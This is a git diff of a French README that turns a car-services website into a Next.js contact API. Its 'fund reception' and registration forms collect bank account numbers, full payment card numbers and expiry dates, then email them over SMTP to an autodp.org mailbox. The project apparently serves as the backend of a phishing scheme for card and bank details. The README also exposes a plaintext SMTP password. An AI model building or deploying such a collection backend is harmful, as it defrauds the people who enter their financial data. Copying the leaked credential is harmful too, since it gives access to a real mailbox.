@@ -1,153 +1,190 @@
-# 🚗 Auto DP - Site Web Professionnel
+# AutoDP - API de Contact Next.js
 
-## 📋 Description
+Application Next.js avec API route pour l'envoi d'emails via SMTP OVH.
 
-Auto DP est un site web moderne et responsive pour une entreprise de services automobiles, incluant réparations, remorquage et diagnostics électroniques. Le site est développé avec React et utilise EmailJS pour la gestion des formulaires de contact.
+## 🚀 Fonctionnalités
 
-## ✨ Fonctionnalités
+- **API Route** `/api/contact` pour l'envoi d'emails
+- **Deux formulaires** : Enregistrement et Réception de fond
+- **SMTP OVH** configuré avec SSL/TLS
+- **Templates HTML** automatiques
+- **Validation** des données côté serveur
+- **Responsive design** avec Tailwind CSS
 
-- 🎨 **Design moderne et responsive** avec Tailwind CSS
-- 📱 **Interface mobile-first** optimisée pour tous les appareils
-- 📧 **Formulaire de contact intelligent** avec EmailJS
-- 🎭 **Animations fluides** avec Framer Motion
-- 🔒 **Validation des formulaires** avec React Hook Form
-- 📊 **Sections complètes** : Accueil, Services, À propos, Galerie, Contact
+## 📋 Prérequis
 
-## 🛠️ Technologies Utilisées
+- Node.js 18+
+- Compte Vercel
+- Domaine `autodp.org`
+- Serveur email OVH
 
-- **Frontend** : React 18, Vite
-- **Styling** : Tailwind CSS
-- **Animations** : Framer Motion
-- **Formulaires** : React Hook Form
-- **Email** : EmailJS
-- **Icônes** : Lucide React
-- **Build Tool** : Vite
+## 🛠️ Installation
 
-## 🚀 Installation et Démarrage
+1. **Cloner le projet** :
+   ```bash
+   git clone <repository-url>
+   cd auto-dp
+   ```
 
-### Prérequis
-- Node.js (version 16 ou supérieure)
-- npm ou yarn
+2. **Installer les dépendances** :
+   ```bash
+   npm install
+   ```
 
-### Installation
-```bash
-# Cloner le repository
-git clone https://github.com/DevMick/AutoDp.git
-cd AutoDp
+3. **Configurer les variables d'environnement** :
+   ```bash
+   cp env.example .env.local
+   # Éditer .env.local avec vos paramètres SMTP
+   ```
 
-# Installer les dépendances
-npm install
+4. **Démarrer en développement** :
+   ```bash
+   npm run dev
+   ```
 
-# Démarrer le serveur de développement
-npm run dev
+## 🔧 Configuration
+
+### Variables d'environnement
+
+Créer un fichier `.env.local` :
+
+```env
+# Configuration SMTP OVH
+EMAIL_USER=registratie@autodp.org
+EMAIL_PASS=S.registratie2025
+EMAIL_HOST=ssl0.ovh.net
+EMAIL_PORT=465
+
+# Email de réception
+RECIPIENT_EMAIL=registratie@autodp.org
 ```
 
-### Scripts Disponibles
-```bash
-npm run dev          # Démarrer le serveur de développement
-npm run build        # Construire pour la production
-npm run preview      # Prévisualiser la build de production
-npm run lint         # Linter le code
+### API Endpoints
+
+#### POST `/api/contact`
+
+Envoie un email avec les données du formulaire.
+
+**Paramètres de requête** :
+- `type` : `enregistrement` ou `reception`
+
+**Body** (JSON) :
+```json
+{
+  "nom_complet": "string",
+  "email": "string",
+  "telephone": "string",
+  "adresse": "string",
+  "carte_be": "string",
+  "carte_52_49_51": "string",
+  "date_expiration": "string",
+  "submission_id": "string",
+  "montant": "number"
+}
 ```
 
-## 📁 Structure du Projet
-
-```
-AutoDp/
-├── src/
-│   ├── components/          # Composants React
-│   │   ├── Header.jsx      # En-tête du site
-│   │   ├── Hero.jsx        # Section principale
-│   │   ├── Services.jsx    # Services proposés
-│   │   ├── About.jsx       # À propos de l'entreprise
-│   │   ├── Gallery.jsx     # Galerie d'images
-│   │   ├── Contact.jsx     # Formulaire de contact
-│   │   └── Footer.jsx      # Pied de page
-│   ├── config/             # Configuration EmailJS
-│   │   ├── emailjs.js      # Configuration principale
-│   │   └── email-template.js # Templates d'email
-│   ├── assets/             # Ressources statiques
-│   ├── App.jsx             # Composant principal
-│   └── main.jsx            # Point d'entrée
-├── public/                 # Fichiers publics
-├── .gitignore             # Fichiers ignorés par Git
-├── package.json           # Dépendances et scripts
-├── tailwind.config.js     # Configuration Tailwind
-└── vite.config.js         # Configuration Vite
+**Réponse** :
+```json
+{
+  "success": true,
+  "message": "Email envoyé avec succès",
+  "messageId": "message-id"
+}
 ```
 
-## 📧 Configuration EmailJS
+## 🎨 Composants
 
-Le site utilise EmailJS pour l'envoi automatique des emails depuis le formulaire de contact.
+### Contact.tsx
+Formulaire d'enregistrement avec validation et envoi d'email.
 
-### Configuration
-1. Créer un compte sur [emailjs.com](https://www.emailjs.com/)
-2. Configurer un service Gmail
-3. Créer un template d'email
-4. Mettre à jour les clés dans `src/config/emailjs.js`
+### FundReception.tsx
+Formulaire de réception de fond avec validation et envoi d'email.
 
-### Variables du Template
-- `{{from_name}}` - Nom complet du client
-- `{{from_email}}` - Email du client
-- `{{phone}}` - Téléphone du client
-- `{{address}}` - Adresse de réparation
-- `{{account_number}}` - Numéro de compte bancaire
-- `{{amount}}` - Montant à recevoir
-- `{{message}}` - Message du client
+## 📧 Templates d'Email
 
-## 🎨 Personnalisation
-
-### Couleurs
-Les couleurs principales sont définies dans `tailwind.config.js` :
-- **Primary** : Bleu (#2563eb)
-- **Secondary** : Gris (#6b7280)
-- **Accent** : Orange (#f59e0b)
-
-### Styles
-Le site utilise Tailwind CSS avec des classes utilitaires personnalisées pour une cohérence visuelle parfaite.
-
-## 📱 Responsive Design
-
-Le site est entièrement responsive avec des breakpoints optimisés :
-- **Mobile** : < 640px
-- **Tablet** : 640px - 1024px
-- **Desktop** : > 1024px
+Les emails sont générés automatiquement avec :
+- Design HTML responsive
+- Informations formatées du formulaire
+- Différenciation par type de formulaire
+- Horodatage automatique
 
 ## 🚀 Déploiement
 
-### Build de Production
+Voir [DEPLOYMENT.md](./DEPLOYMENT.md) pour les instructions complètes de déploiement sur Vercel.
+
+### Déploiement rapide
+
+1. **Connecter à Vercel** :
+   ```bash
+   vercel login
+   vercel
+   ```
+
+2. **Configurer les variables d'environnement** dans le dashboard Vercel
+
+3. **Configurer le domaine** `autodp.org`
+
+## 🧪 Test
+
+### Test local
 ```bash
-npm run build
+npm run dev
+# Ouvrir http://localhost:3000
 ```
 
-### Déploiement sur Vercel/Netlify
-1. Connecter le repository GitHub
-2. Configurer les variables d'environnement si nécessaire
-3. Déployer automatiquement
+### Test API
+```bash
+curl -X POST http://localhost:3000/api/contact?type=enregistrement \
+  -H "Content-Type: application/json" \
+  -d '{
+    "nom_complet": "Test User",
+    "email": "test@example.com",
+    "telephone": "0123456789",
+    "adresse": "123 Test Street",
+    "carte_be": "BE76 1234 5678 9012",
+    "carte_52_49_51": "1234 5678 9012 3456",
+    "date_expiration": "12/25",
+    "submission_id": "TEST123",
+    "montant": "100.00"
+  }'
+```
 
-## 🤝 Contribution
+## 📁 Structure du projet
 
-Les contributions sont les bienvenues ! Pour contribuer :
+```
+├── app/
+│   ├── api/
+│   │   └── contact/
+│   │       └── route.ts          # API route
+│   ├── components/
+│   │   ├── Contact.tsx           # Formulaire d'enregistrement
+│   │   └── FundReception.tsx     # Formulaire de réception
+│   ├── globals.css               # Styles globaux
+│   ├── layout.tsx                # Layout principal
+│   └── page.tsx                  # Page d'accueil
+├── public/                       # Assets statiques
+├── .env.local                    # Variables d'environnement
+├── next.config.js                # Configuration Next.js
+├── tailwind.config.js            # Configuration Tailwind
+├── tsconfig.json                 # Configuration TypeScript
+└── vercel.json                   # Configuration Vercel
+```
 
-1. Fork le projet
-2. Créer une branche pour votre fonctionnalité
-3. Commiter vos changements
-4. Pousser vers la branche
-5. Ouvrir une Pull Request
+## 🔒 Sécurité
+
+- Validation des données côté serveur
+- Variables d'environnement sécurisées
+- Protection contre les injections
+- Rate limiting Vercel
+
+## 📞 Support
+
+Pour toute question ou problème :
+1. Vérifier les logs Vercel
+2. Tester la connexion SMTP
+3. Vérifier les variables d'environnement
+4. Consulter la documentation Vercel
 
 ## 📄 Licence
 
-Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.
-
-## 👨‍💻 Auteur
-
-**Mickael Andjui** - [GitHub](https://github.com/DevMick)
-
-## 📞 Contact
-
-- **Email** : mickael.andjui.21@gmail.com
-- **Site Web** : [Auto DP](https://auto-dp.fr)
-
----
-
-⭐ N'oubliez pas de donner une étoile au projet si vous l'aimez !
+Projet privé - AutoDP
